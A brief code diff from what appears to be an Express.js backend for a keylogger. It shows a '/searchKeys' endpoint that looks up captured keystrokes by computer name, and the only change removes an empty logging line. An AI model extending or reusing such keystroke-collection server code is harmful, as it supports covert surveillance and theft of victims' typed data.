@@ -92,7 +92,6 @@ app.post("/sendkeys", (req, res) => {
  *  API Endpoint that allows us to search keystrokes based on the computer name.
  */
 app.post("/searchKeys", (req, res) => {
-  console.log();
   keyloggerService
     .getKeyStrokesByName(req.body.computerName)
     .then(resp => {
